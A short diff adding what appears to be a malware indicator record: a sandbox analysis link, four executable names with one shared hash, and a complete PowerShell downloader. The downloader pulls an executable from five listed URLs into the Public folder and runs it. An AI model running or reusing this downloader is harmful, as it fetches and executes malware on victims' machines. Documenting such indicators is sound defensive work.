@@ -1,0 +1,9 @@
+Any.Run: https://app.any.run/tasks/ac319482-cd39-4d34-ad32-d1e9d7de5a2b
+
+1438706.exe = 1f70eea3cc9b72c8133f7e84127f8b9c
+202.exe = 1f70eea3cc9b72c8133f7e84127f8b9c
+69479.exe = 1f70eea3cc9b72c8133f7e84127f8b9c
+srvloada.exe = 1f70eea3cc9b72c8133f7e84127f8b9c
+
+Powershell script: powershell $njT=new-object Net.WebClient;$qGw='http://marqets.ru/tlyJ@http://7continents7lawns.com/huWJYej@http://7naturalessences.com/iX@http://dek-kam.ru/09XTe@http://krever.jp/bvu0'.Split('@');$Flj = '118';$mwj=$env:public+'\'+$Flj+'.exe';foreach($sMz in $qGw){try{$njT.DownloadFile($sMz, $mwj);Invoke-Item $mwj;break;}catch{}}
+
